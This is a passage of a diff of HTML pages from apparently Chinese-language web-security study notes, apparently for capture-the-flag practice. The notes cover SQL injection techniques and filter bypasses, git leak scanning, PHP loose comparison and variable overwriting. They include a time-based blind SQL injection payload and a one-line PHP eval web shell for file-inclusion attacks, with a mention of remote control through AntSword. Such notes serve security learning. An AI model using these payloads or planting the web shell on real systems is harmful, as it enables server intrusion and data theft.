 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
-<span class="normal"><a href="#__codelineno-8-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>uname=&#39;=&#39;&#39; AND IF({condition}, SLEEP(0), SLEEP(5)) AND &#39;&#39;=&#39;&amp;email=a&amp;passwd=b
-<a id="__codelineno-8-2" name="__codelineno-8-2"></a>uname=&#39;, DATABASE(), &#39;&#39;)#&amp;email=a&amp;passwd=b /* #号是注释 */
+<span class="normal"><a href="#__codelineno-8-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>uname='='' AND IF({condition}, SLEEP(0), SLEEP(5)) AND ''='&amp;email=a&amp;passwd=b
+<a id="__codelineno-8-2" name="__codelineno-8-2"></a>uname=', DATABASE(), '')#&amp;email=a&amp;passwd=b /* #号是注释 */
 </code></pre></div></td></tr></table></div>
 <p>报错注入：构造错误路径，让报错输出错误的路径，不能有语法错误，否则语法错误会掩盖路径错误。</p>
 <p>堆叠注入：一行语句内有多条指令，即多个分号分隔的指令。</p>
 <p>二次注入：第一次注入的时候恶意指令被转义，但存入数据库的指令没有转义，于是第二次注入时只需调出存入数据库的指令，就能实现拼接指令（需要在第二次注入的时候没有转义的判断）。</p>
-<h3 id="_5">注入绕过<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<h3 id="_5">注入绕过<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
 <p>关键字/正则：大小写，等价命令，重复输入</p>
 <p>语义匹配：嵌套注释</p>
 <p>其他：</p>
-<p><img alt="1720512454746" src="../image/Web/1720512454746.png" /></p>
+<p><img alt="1720512454746" src="../image/Web/1720512454746.png"></p>
 <p>大多数获取数据的语句都需要用到select关键词，如果select完全被屏蔽了可以试着使用table语句。（这个处理方法只支持MySQL8以上的版本）</p>
-<h3 id="_6">一些简单攻击<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
-<h4 id="git-leaks-file-leaks">Git leaks &amp; file leaks<a class="headerlink" href="#git-leaks-file-leaks" title="Permanent link">&para;</a></h4>
+<h3 id="_6">一些简单攻击<a class="headerlink" href="#_6" title="Permanent link">¶</a></h3>
+<h4 id="git-leaks-file-leaks">Git leaks &amp; file leaks<a class="headerlink" href="#git-leaks-file-leaks" title="Permanent link">¶</a></h4>
 <ul>
 <li>Scan possible folders: using <code>dirsearch -u &lt;http://</code></li>
 <li>Using GitHack to extract key info from <code>.git</code> folder</li>
 </ul>
-<h4 id="_7">弱比较<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<h4 id="_7">弱比较<a class="headerlink" href="#_7" title="Permanent link">¶</a></h4>
 <p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较（强比较）</p>
 <p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较（弱比较）</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
@@ -1355,12 +1416,12 @@
 <span class="normal"><a href="#__codelineno-9-6">6</a></span>
 <span class="normal"><a href="#__codelineno-9-7">7</a></span>
 <span class="normal"><a href="#__codelineno-9-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="cp">&lt;?php</span>
-<a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">//true</span>
-<a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">&quot;1a&quot;</span><span class="o">==</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//true</span>
-<a id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">&quot;a1&quot;</span><span class="o">==</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//false</span>
-<a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">&quot;a1&quot;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">//true</span>
-<a id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">&quot;0e123456&quot;</span><span class="o">==</span><span class="s2">&quot;0e234567&quot;</span><span class="p">);</span> <span class="c1">//true</span>
-<a id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="nb">var_dump</span><span class="p">(</span><span class="mi">0</span><span class="o">==</span><span class="s2">&quot;1a&quot;</span><span class="p">);</span> <span class="c1">//false</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">"a"</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">//true</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">"1a"</span><span class="o">==</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//true</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">"a1"</span><span class="o">==</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//false</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">"a1"</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">//true</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="nb">var_dump</span><span class="p">(</span><span class="s2">"0e123456"</span><span class="o">==</span><span class="s2">"0e234567"</span><span class="p">);</span> <span class="c1">//true</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="nb">var_dump</span><span class="p">(</span><span class="mi">0</span><span class="o">==</span><span class="s2">"1a"</span><span class="p">);</span> <span class="c1">//false</span>
 <a id="__codelineno-9-8" name="__codelineno-9-8"></a><span class="cp">?&gt;</span><span class="x"> </span>
 </code></pre></div></td></tr></table></div>
 <details class="note">
@@ -1392,16 +1453,16 @@
 </li>
 </ol>
 </details>
-<h4 id="_8">变量覆盖<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h4>
+<h4 id="_8">变量覆盖<a class="headerlink" href="#_8" title="Permanent link">¶</a></h4>
 <p>创建新的同名变量可以覆盖原变量，如用extract()展开键值对。</p>
-<h4 id="_9">文件包含<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h4>
+<h4 id="_9">文件包含<a class="headerlink" href="#_9" title="Permanent link">¶</a></h4>
 <p>文件包含漏洞（File Inclusion Vulnerability）是一种常见的Web应用程序安全漏洞，攻击者可以通过操纵输入参数，使应用程序包含并执行任意文件。这种漏洞通常发生在PHP等支持文件包含功能的编程语言中，能造成文件泄露和代码注入。</p>
 <p>文件泄露可以用于读取服务器内容，代码注入可以向服务器上传木马。</p>
 <p>常用的技巧有PHP伪协议、包含session文件、包含临时文件、包含上传文件、包含本地文件等。</p>
 <p>以包含上传文件为例，可以用简单的一句话木马来实现代码注入：</p>
-<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="cp">&lt;?</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="cp">&lt;?</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]);</span>
 </code></pre></div></td></tr></table></div>
-<p>这个代码的eval函数能够让服务器执行POST请求中的a参数包含的代码，这样就能让服务器执行任意指令，然后就可以使用中国蚁剑来实现图形化控制远程服务器。</p>
+<p>这个代码的eval函数能够让服务器执行POST请求中的a参数包含的代码，这样就能让服务器执行任意指令，然后就可以使用中国蚁剑来实现图形化控制远程服务器。</p></div>
 
 
 
